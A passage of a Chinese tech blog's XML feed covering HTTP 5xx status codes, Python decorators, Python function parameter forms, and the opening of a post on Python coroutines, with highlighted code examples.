title="5××"></a>5××</h3><ul><li><p><strong>500 Internal Server Error</strong>：通用错误码，表示服务器内部发生错误，但究竟发生了什么错误我们不得而知。不过对于服务器来说这应该是好事，通常不应该把服务器内部的详细信息，例如出错的函数调用栈告诉外界，防止黑客的窥探或者分析。</p></li><li><p><strong>501 Not Implemented</strong>：表示客户端请求的功能还不支持，这个错误码比 500 要更温和一些。</p></li><li><p><strong>502 Bad Gateway：</strong>通常是服务器 <strong>作为网关或者代理</strong> 时返回的错误码，表示服务器自身工作正常，访问后端服务器时发生了错误，但具体的错误原因也是不知道的。</p></li><li><p><strong>503 Service Unavailable</strong>：表示服务器当前繁忙，暂时无法响应服务。</p><blockquote><p>503 是一个 <strong>临时</strong> 的状态，很可能过几秒后服务器就可以继续提供服务了，所以 503 响应头里通常还会有一个 <strong>Retry-After</strong> 字段，指示客户端可以在多久之后再次尝试发送请求。</p></blockquote></li></ul>]]></content>
    
    
    <categories>
      
      <category>后端开发</category>
      
      <category>通用技术</category>
      
    </categories>
    
    
    <tags>
      
      <tag>HTTP</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>Python 装饰器</title>
    <link href="/post/Python%E8%A3%85%E9%A5%B0%E5%99%A8/"/>
    <url>/post/Python%E8%A3%85%E9%A5%B0%E5%99%A8/</url>
    
    <content type="html"><![CDATA[<p>装饰器（Decorators）是 Python 的一个重要部分。所谓的装饰器，就是修改其他函数的功能的函数，使用装饰器可以在不改变原函数的基础上扩充原函数功能。</p><h2 id="函数也是对象"><a href="#函数也是对象" class="headerlink" title="函数也是对象"></a>函数也是对象</h2><p>在 Python 中，函数是头等公民（First-class Citizen），其本身是一个对象，这意味着：</p><ul><li>可以把函数赋予变量；</li><li>可以在函数内部定义函数（函数嵌套）；</li><li>函数可以作为其他函数的参数传递；</li><li>函数的返回值也可以是函数对象（闭包）。</li></ul><p><strong>示例：函数的嵌套与闭包</strong></p><figure class="highlight python"><table><tr><td class="gutter"><div class="code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></div></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment"># outer_func是外围函数</span><br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">outer_func</span>():</span><br>    name = <span class="hljs-string">&quot;I&#x27;m closure&quot;</span><br><br>    <span class="hljs-comment"># inner_func是嵌套函数</span><br>    <span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">inner_func</span>(<span class="hljs-params">msg</span>):</span><br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">f&#x27;<span class="hljs-subst">&#123;msg&#125;</span><span class="hljs-subst">&#123;name&#125;</span>&#x27;</span>)<br><br>    <span class="hljs-keyword">return</span> inner_func<br><br><br>closure = outer_func()  <span class="hljs-comment"># 获得一个闭包</span><br>closure(<span class="hljs-string">&#x27;Hello, &#x27;</span>)  <span class="hljs-comment"># Hello, I&#x27;m closure</span><br></code></pre></td></tr></table></figure><h2 id="函数装饰器"><a href="#函数装饰器" class="headerlink" title="函数装饰器"></a>函数装饰器</h2><p><strong>示例一：函数装饰器</strong></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">decorator</span>(<span class="hljs-params">func</span>):</span><br>    <span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">wrapper</span>(<span class="hljs-params">*args, **kwargs</span>):</span><br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;wrapper of decorator&#x27;</span>)<br>        func(*args, **kwargs)<br><br>    <span class="hljs-keyword">return</span> wrapper<br><br><br><span class="hljs-meta">@decorator  </span><span class="hljs-comment"># 语法糖，等同于 greet = decorator(greet)</span><br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">greet</span>(<span class="hljs-params">msg</span>):</span><br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">f&#x27;<span class="hljs-subst">&#123;msg&#125;</span>, world&#x27;</span>)<br><br><br>greet(<span class="hljs-string">&#x27;hello&#x27;</span>)<br>greet(<span class="hljs-string">&#x27;goodbye&#x27;</span>)<br></code></pre></td></tr></table></figure><p><strong>示例二：带参数的装饰器</strong></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">repeat</span>(<span class="hljs-params">num</span>):</span><br>    <span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">decorator</span>(<span class="hljs-params">func</span>):</span><br>        <span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">wrapper</span>(<span class="hljs-params">*args, **kwargs</span>):</span><br>            <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(num):<br>                <span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;wrapper of decorator&#x27;</span>)<br>                func(*args, **kwargs)<br><br>        <span class="hljs-keyword">return</span> wrapper<br><br>    <span class="hljs-keyword">return</span> decorator<br><br><br><span class="hljs-meta">@repeat(<span class="hljs-params"><span class="hljs-number">3</span></span>)  </span><span class="hljs-comment"># 等同于 greet = repeat(3)(greet)</span><br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">greet</span>(<span class="hljs-params">msg</span>):</span><br>    <span class="hljs-built_in">print</span>(msg)<br><br><br>greet(<span class="hljs-string">&#x27;hello world&#x27;</span>)<br></code></pre></td></tr></table></figure><p><strong>示例三：装饰器的嵌套</strong></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-string">&quot;&quot;&quot;</span><br><span class="hljs-string">Python也支持多个装饰器，比如写成下面这样的形式，它的执行顺序从上到下：</span><br><span class="hljs-string">@decorator1</span><br><span class="hljs-string">@decorator2</span><br><span class="hljs-string">@decorator3def func():</span><br><span class="hljs-string">...</span><br><span class="hljs-string">上面的语句等同于下面这行代码：</span><br><span class="hljs-string">func = decorator1(decorator2(decorator3(func)))</span><br><span class="hljs-string">&quot;&quot;&quot;</span><br><br><br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">decorator1</span>(<span class="hljs-params">func</span>):</span><br>    <span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">wrapper</span>(<span class="hljs-params">*args, **kwargs</span>):</span><br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;call decorator1&#x27;</span>)<br>        func(*args, **kwargs)<br><br>    <span class="hljs-keyword">return</span> wrapper<br><br><br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">decorator2</span>(<span class="hljs-params">func</span>):</span><br>    <span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">wrapper</span>(<span class="hljs-params">*args, **kwargs</span>):</span><br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;call decorator2&#x27;</span>)<br>        func(*args, **kwargs)<br><br>    <span class="hljs-keyword">return</span> wrapper<br><br><br><span class="hljs-meta">@decorator1</span><br><span class="hljs-meta">@decorator2</span><br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">greet</span>(<span class="hljs-params">message</span>):</span><br>    <span class="hljs-built_in">print</span>(message)<br><br><br>greet(<span class="hljs-string">&#x27;hello world&#x27;</span>)  <span class="hljs-comment"># call decorator1、call decorator2、hello world</span><br></code></pre></td></tr></table></figure><p><strong>示例四：保留原函数的元信息</strong></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment"># 打印greet函数的元信息，发现greet函数被wrapper函数取代了</span><br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">decorator</span>(<span class="hljs-params">func</span>):</span><br>    <span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">wrapper</span>(<span class="hljs-params">*args, **kwargs</span>):</span><br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;wrapper of decorator&#x27;</span>)<br>        func(*args, **kwargs)<br><br>    <span class="hljs-keyword">return</span> wrapper<br><br><br><span class="hljs-meta">@decorator</span><br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">greet</span>(<span class="hljs-params">msg</span>):</span><br>    <span class="hljs-built_in">print</span>(msg)<br><br><br><span class="hljs-built_in">print</span>(greet.__name__)  <span class="hljs-comment"># wrapper</span><br><span class="hljs-built_in">help</span>(greet)  <span class="hljs-comment"># Help on function wrapper in module __main__: wrapper(*args, **kwargs)</span><br><br>---------<br><span class="hljs-comment"># 使用内置的装饰器@functools.wrap，保留原函数的元信息（也就是将原函数的元信息，拷贝到对应的装饰器函数里）。</span><br><span class="hljs-keyword">import</span> functools<br><br><br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">decorator</span>(<span class="hljs-params">func</span>):</span><br><span class="hljs-meta">    @functools.wraps(<span class="hljs-params">func</span>)</span><br>    <span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">wrapper</span>(<span class="hljs-params">*args, **kwargs</span>):</span><br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;wrapper of decorator&#x27;</span>)<br>        func(*args, **kwargs)<br><br>    <span class="hljs-keyword">return</span> wrapper<br><br><br><span class="hljs-meta">@decorator</span><br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">greet</span>(<span class="hljs-params">msg</span>):</span><br>    <span class="hljs-built_in">print</span>(msg)<br><br><br><span class="hljs-built_in">print</span>(greet.__name__)  <span class="hljs-comment"># greet</span><br><span class="hljs-built_in">help</span>(greet)  <span class="hljs-comment"># Help on function greet in module __main__: greet(msg)</span><br></code></pre></td></tr></table></figure><h2 id="类装饰器"><a href="#类装饰器" class="headerlink" title="类装饰器"></a>类装饰器</h2><p>除了函数可以作为装饰器，类也可以作为装饰器。类装饰器主要依赖于 <code>__call__()</code> 函数，每当调用一次类的实例时，<code>__call__()</code> 函数就会被执行一次。</p><p><strong>示例：构建类装饰器</strong></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Count</span>(<span class="hljs-params"><span class="hljs-built_in">object</span></span>):</span><br>    <span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">__init__</span>(<span class="hljs-params">self, func</span>):</span><br>        self.func = func<br>        self.num_calls = <span class="hljs-number">0</span><br><br>    <span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">__call__</span>(<span class="hljs-params">self, *args, **kwargs</span>):</span><br>        self.num_calls += <span class="hljs-number">1</span><br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">f&#x27;num of calls is: <span class="hljs-subst">&#123;self.num_calls&#125;</span>&#x27;</span>)<br>        <span class="hljs-keyword">return</span> self.func(*args, **kwargs)<br><br><br><span class="hljs-meta">@Count  </span><span class="hljs-comment"># 等同于 greet = Count(greet)</span><br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">greet</span>():</span><br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;hello world&#x27;</span>)<br><br><br><span class="hljs-keyword">for</span> _ <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">3</span>):<br>    greet()<br></code></pre></td></tr></table></figure>]]></content>
    
    
    <categories>
      
      <category>后端开发</category>
      
      <category>Python</category>
      
    </categories>
    
    
    <tags>
      
      <tag>Python3</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>Python 函数定义</title>
    <link href="/post/Python%E5%87%BD%E6%95%B0%E5%AE%9A%E4%B9%89/"/>
    <url>/post/Python%E5%87%BD%E6%95%B0%E5%AE%9A%E4%B9%89/</url>
    
    <content type="html"><![CDATA[<p>本文详细介绍了 Python 函数声明和定义的各种方式，有些在阅读标准库函数和开源代码时经常会遇到，特此整理总结一下。</p><h2 id="类型建议符"><a href="#类型建议符" class="headerlink" title="类型建议符"></a>类型建议符</h2><p><strong>类型建议符（Type Hints）</strong>是 Python 3.5 新增的功能，在 <code>typing</code> 模块中实现。可以通过 <strong>冒号</strong> 和 <strong>箭头</strong> 来表示函数的参数类型和返回值类型，主要起到 <strong>注释</strong> 的作用。</p><ul><li>冒号：函数参数的类型建议符</li><li>箭头：函数返回值的类型建议符</li></ul><blockquote><p>Python 运行时不强制执行函数和变量类型注解（实际使用中违反了也不会报错），但这些注解可用于类型检查器、IDE、静态检查器等第三方工具。</p></blockquote><p>typing 模块的常用类型：</p><ul><li>Union：并集，<code>Union[X, Y]</code> 表示要么 X 类型、要么 Y 类型。</li><li>Optional：可选，等同于 <code>Union[X, None]</code>，表示可以为 None。</li></ul><p><strong>示例：类型建议符的使用</strong></p><figure class="highlight python"><table><tr><td class="gutter"><div class="code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></div></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment"># 声明函数的参数为str类型，返回值为int类型</span><br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">converse</span>(<span class="hljs-params">x: <span class="hljs-built_in">str</span></span>) -&gt; <span class="hljs-built_in">int</span>:</span><br>    <span class="hljs-keyword">return</span> <span class="hljs-built_in">int</span>(x)<br></code></pre></td></tr></table></figure><blockquote><p>Ellipsis 对象（…）：语义上表示省略，可以在 Type Hints 中做占位符使用。</p></blockquote><h2 id="关键字参数"><a href="#关键字参数" class="headerlink" title="关键字参数"></a>关键字参数</h2><p>如果你有一些具有许多参数的函数，而你又希望只对其中的一些进行指定，那么你可以通过 <strong>关键字</strong> 而非 <strong>位置</strong> 来给这些参数赋值。这样做有两大优点：</p><ol><li>不再需要考虑参数的顺序，函数的使用将更加容易。</li><li>可以只对需要指定的参数赋值，只要其它的参数都具有默认参数值。</li></ol><p><strong>示例：关键字参数的使用</strong></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">func</span>(<span class="hljs-params">a, b=<span class="hljs-number">5</span>, c=<span class="hljs-number">10</span></span>):</span><br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">f&#x27;a:<span class="hljs-subst">&#123;a&#125;</span>, b:<span class="hljs-subst">&#123;b&#125;</span>, c:<span class="hljs-subst">&#123;c&#125;</span>&#x27;</span>)<br><br><br>func(<span class="hljs-number">1</span>, <span class="hljs-number">2</span>)  <span class="hljs-comment"># a:1, b:2, c:10</span><br>func(<span class="hljs-number">1</span>, c=<span class="hljs-number">2</span>)  <span class="hljs-comment"># a:1, b:5, c:2</span><br>func(c=<span class="hljs-number">2</span>, a=<span class="hljs-number">1</span>)  <span class="hljs-comment"># a:1, b:5, c:2</span><br></code></pre></td></tr></table></figure><h2 id="可变参数"><a href="#可变参数" class="headerlink" title="可变参数"></a>可变参数</h2><p>在 Python 函数定义中，使用 <code>*args</code> 星号参数或 <code>**kwargs</code> 双星号参数声明参数列表可接受任意数量的参数，统称为可变参数。</p><p><strong>函数定义时</strong></p><ul><li><code>*args</code> 表示可接受任意个（包含0个）位置参数，当函数调用时，所有未匹配的位置参数（Positional Arguments）会被组成一个 tuple 对象，局部变量 args 指向此 tuple 对象。</li><li><code>**kwargs</code> 表示可接受任意个（包含0个）关键字参数，当函数调用时，所有未匹配的关键字参数（Keyword Arguments）会被组成一个 dict 对象，局部变量kwargs 指向此 dict 对象。</li></ul><p><strong>函数调用时</strong></p><ul><li><code>*var</code> 表示解包 tuple 对象中的每个元素作为函数调用时传入的位置参数。</li><li><code>**var</code> 表示解包 dict 对象中的每个元素作为函数调用时传入的关键字参数。</li></ul><blockquote><p>注：<strong>元组解包</strong> 是完全独立的一个功能，在未定义可变参数的函数上也可以使用。</p></blockquote><p><strong>示例：可变参数的使用</strong></p> <figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">func</span>(<span class="hljs-params">*args, **kwargs</span>):</span><br>    <span class="hljs-keyword">if</span> args:<br>        <span class="hljs-built_in">print</span>(args)<br>        <span class="hljs-keyword">for</span> item <span class="hljs-keyword">in</span> args:<br>            <span class="hljs-built_in">print</span>(item)<br>    <span class="hljs-keyword">if</span> kwargs:<br>        <span class="hljs-built_in">print</span>(kwargs)<br>        <span class="hljs-keyword">for</span> k, v <span class="hljs-keyword">in</span> kwargs.items():<br>            <span class="hljs-built_in">print</span>(k, v)<br><br><br>my_tuple = (<span class="hljs-number">1</span>, <span class="hljs-string">&#x27;a&#x27;</span>, [<span class="hljs-number">1</span>, <span class="hljs-number">2</span>, <span class="hljs-number">3</span>])<br>func(*my_tuple)  <span class="hljs-comment"># 等同于 func(1, &#x27;a&#x27;, [1, 2, 3])</span><br><br>my_dict = &#123;<span class="hljs-string">&#x27;name&#x27;</span>: <span class="hljs-string">&#x27;xiao bing&#x27;</span>, <span class="hljs-string">&#x27;age&#x27;</span>: <span class="hljs-number">23</span>&#125;<br>func(**my_dict)  <span class="hljs-comment"># 等同于 func(name=&#x27;xiao bing&#x27;, age=23)</span><br><br><span class="hljs-comment"># 复杂参数传递</span><br>threading.Thread(target=web.run_app, args=[app], kwargs=&#123;<span class="hljs-string">&#x27;host&#x27;</span>: <span class="hljs-string">&#x27;127.0.0.1&#x27;</span>, <span class="hljs-string">&#x27;port&#x27;</span>: <span class="hljs-number">9643</span>&#125;).start()<br></code></pre></td></tr></table></figure><h2 id="限定参数"><a href="#限定参数" class="headerlink" title="限定参数"></a>限定参数</h2><p>从 Python 3.8 开始，函数参数中允许出现 <code>/</code> 和 <code>*</code> 号，分别表示 <strong>限定位置参数</strong> 和 <strong>限定关键字参数</strong>（也称作命名关键字参数）。<code>/</code> 用来指明在其前面的参数必须使用位置参数而非关键字参数的形式，<code>*</code> 单独出现在参数中表示其后面的参数必须为关键字参数形式。</p><p><strong>示例一：限定参数的使用</strong></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">func</span>(<span class="hljs-params">a, b, /, c=<span class="hljs-number">10</span>, *, d, e=<span class="hljs-number">50</span></span>):</span><br>    <span class="hljs-built_in">print</span>(a + b + c + d + e)<br><br><br>func(<span class="hljs-number">1</span>, <span class="hljs-number">2</span>, <span class="hljs-number">3</span>, d=<span class="hljs-number">4</span>, e=<span class="hljs-number">5</span>)<br></code></pre></td></tr></table></figure><p><strong>示例二：综合应用</strong></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment"># 以下代码的输出是什么？</span><br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">func</span>(<span class="hljs-params">a: <span class="hljs-built_in">list</span>, b: <span class="hljs-built_in">int</span>, /, c=<span class="hljs-number">10.0</span>, *, d: <span class="hljs-built_in">int</span>, e=<span class="hljs-number">50</span>, **f</span>) -&gt; <span class="hljs-built_in">str</span>:</span><br>    <span class="hljs-keyword">return</span> <span class="hljs-string">f&#x27;<span class="hljs-subst">&#123;a + [(b * c) + d + e]&#125;</span> + <span class="hljs-subst">&#123;f&#125;</span>&#x27;</span><br><br><br>data = (<span class="hljs-number">2</span>, <span class="hljs-number">3</span>)<br><span class="hljs-built_in">print</span>(func([<span class="hljs-number">1</span>], *data, value=<span class="hljs-number">123</span>, d=<span class="hljs-number">4</span>, e=<span class="hljs-number">5</span>))  <span class="hljs-comment"># [1, 15] + &#123;&#x27;value&#x27;: 123&#125;</span><br></code></pre></td></tr></table></figure>]]></content>
    
    
    <categories>
      
      <category>后端开发</category>
      
      <category>Python</category>
      
    </categories>
    
    
    <tags>
      
      <tag>Python3</tag>
      
      <tag>命名规范</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>详解 Python 协程</title>
    <link href="/post/%E8%AF%A6%E8%A7%A3Python%E5%8D%8F%E7%A8%8B/"/>
    <url>/post/%E8%AF%A6%E8%A7%A3Python%E5%8D%8F%E7%A8%8B/</url>
    
    <content type="html"><![CDATA[<h2 id="基本概念"><a href="#基本概念" class="headerlink" title="基本概念"></a>基本概念</h2><blockquote><p>通常我们认为线程是轻量级的进程，因此我们也把协程理解为轻量级的线程。</p></blockquote><p>在 Python 中并发编程一般都是使用多线程或者多进程来实现的，对于 CPU 密集型任务由于 GIL 的存在我们通常使用多进程，而对于 IO 密集型任务我们可以通过线程调度，让线程在执行 IO 任务时让出 GIL，从而实现表面上的并发。</p><p>其实对于 IO 密集型任务我们还有另外一种选择，就是 <strong>协程（Coroutine）</strong>。协程的作用是在执行函数 A 时可以随时中断去执行函数 B，然后中断函数 B 继续执行函数 A，即可以在任务间自由切换，<strong>由用户决定，在哪些地方交出控制权</strong>。这一过程看似像多线程，但其实<strong>只有一个线程执行</strong>，协程就相当于是运行在单线程中的“并发”。</p><h3 id="协程有什么优势？"><a href="#协程有什么优势？" class="headerlink" title="协程有什么优势？"></a>协程有什么优势？</h3><ol><li>开销少，执行效率极高：因为子程序（函数）切换不是线程切换，而是由程序自身控制，没有线程上下文切换的开销。所以与多线程相比，线程的数量越多，协程性能的优势就越明显。</li><li>不需要多线程的锁机制：因为只有一个线程，不存在同时写变量冲突，在协程中控制共享资源不需要加锁，也没有状态同步的开销，因此执行效率比多线程高很多。</li><li>方便切换控制流，简化代码逻辑。</li></ol><h3 id="协程如何处理CPU密集型任务？"><a href="#协程如何处理CPU密集型任务？" class="headerlink" title="协程如何处理CPU密集型任务？"></a>协程如何处理CPU密集型任务？</h3><p>协程可以很好地处理 IO 密集型任务的效率问题，但其本质是个单线程，处理 CPU 密集型任务不是它的长处。如果要充分发挥多核 CPU 的性能，最简单的方法是 <strong>多进程+协程</strong>，既充分利用多核，又充分发挥协程的高效率，可以获得极高的性能。</p><h3 id="进程、线程、协程的对比"><a href="#进程、线程、协程的对比" class="headerlink" title="进程、线程、协程的对比"></a>进程、线程、协程的对比</h3><blockquote><p>进程和线程是抢占式的调度（CPU 决定），协程是协同式的调度（代码决定）。</p></blockquote><ul><li><strong>进程</strong>：每个人都领一套工具（环境，上下文）去干活，要干很多工作，人多（核多）就可以做的更快。</li><li><strong>线程</strong>：一个人有一套工具后干活，要干很多工作，先干哪个要听老板的（系统），遇见要等待的事情，老板会叫你先干别的。但老板不懂你干的活，比如你挖一个坑埋一个萝卜再盖土，结果他让你挖坑、埋土、放萝卜，这时候就要用锁告诉老板这个必须先放了萝卜才能埋土。</li><li><strong>协程</strong>：一个人有一套工具后干活，要干很多工作，先干哪个由自己决定（代码），遇见要等待的事情，自己会先干别的。对于老板来说，协程内的工作他不会干预，比如他会让你吃饭，但不会规定先吃哪个菜。而正是因为省去了老板的工作量，才大大提高了公司的效率。</li><li><strong>串行</strong>：一个人有一套工具后干活，要干很多工作，先干哪个完全按写好的清单来，遇见要等待的事情，就等他执行完了再做下一个。</li></ul><h2 id="发展历程"><a href="#发展历程" class="headerlink" title="发展历程"></a>发展历程</h2><ul><li>Python 2.2 中，第一次引入了生成器，生成器实现了一种惰性、多次取值的方法，此时还是通过<code>next</code>构造生成迭代链或进行多次取值。</li><li>Python 2.5 中，引入了<code>yield</code>关键字，使得生成器有了记忆功能，下一次从生成器取值时，可以恢复到上次<code>yield</code>执行的位置。此外，生成器还加入了<code>send</code>方法与<code>yield</code>搭配使用，可以用<code>yield</code>让生成器暂停到一个状态，还可以通过<code>send</code>方法传入一个值来改变其停止位置的状态。</li><li>Python 3.3 中，新增了<code>yield from</code>关键字，实现了在生成器（委派生成器）内部调用另外生成器（子生成器）的功能，可以轻易的重构生成器，比如将多个生成器连接在一起执行。</li><li>Python 3.4 中，新增了 asyncio 库，提供了一个默认的 Event Loop，在语法上支持使用<code>@asyncio.coroutine</code>和<code>yield from</code>实现协程，有了足够的基础工具进行异步并发编程。</li><li>Python 3.5 中，引入了<code>async</code>/<code>await</code>关键字，用以取代<code>@asyncio.coroutine</code>和<code>yield from</code>，从而简化了协程的使用并且便于理解。</li></ul><h2 id="迭代器和生成器"><a href="#迭代器和生成器" class="headerlink" title="迭代器和生成器"></a>迭代器和生成器</h2><h3 id="容器与迭代器"><a href="#容器与迭代器" class="headerlink" title="容器与迭代器"></a>容器与迭代器</h3><p>在 Python 中一切皆对象，对象的抽象就是类，而 <strong>对象的集合就是容器</strong>，比如字符串、列表、元组、字典、集合都是容器。不同容器的区别，在于内部数据结构的实现方法。</p><p>所有的容器都是 <strong>可迭代的（iterable）</strong>，即可迭代对象。这里的迭代，和枚举不完全一样。迭代可以想象成是你去买苹果，卖家并不告诉你他有多少库存。这样，每次你都需要告诉卖家，你要一个苹果，然后卖家采取行为：要么给你拿一个苹果；要么告诉你，苹果已经卖完了。你并不需要知道，卖家在仓库是怎么摆放苹果的。</p><p>严谨地说，<strong>迭代器（iterator）</strong>提供了一个 <strong>_<em>next</em>_</strong> 方法，调用这个方法后，你要么得到这个容器的下一个对象，要么得到一个 <code>StopIteration</code> 异常。对于可迭代对象，通过调用 <strong>iter()</strong> 函数可以得到一个迭代器，迭代器可以通过 <strong>next()</strong> 函数来得到下一个元素，从而实现遍历，<code>for...in...</code> 语句就是将这个过程隐式化。</p><p><strong>示例：遍历迭代器对象</strong></p><figure class="highlight python"><table><tr><td class="gutter"><div class="code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></div></td><td class="code"><pre><code class="hljs python">iterable_list = <span class="hljs-built_in">iter</span>([<span class="hljs-number">1</span>, <span class="hljs-number">2</span>])<br><br><span class="hljs-keyword">while</span> <span class="hljs-literal">True</span>:<br>    <span 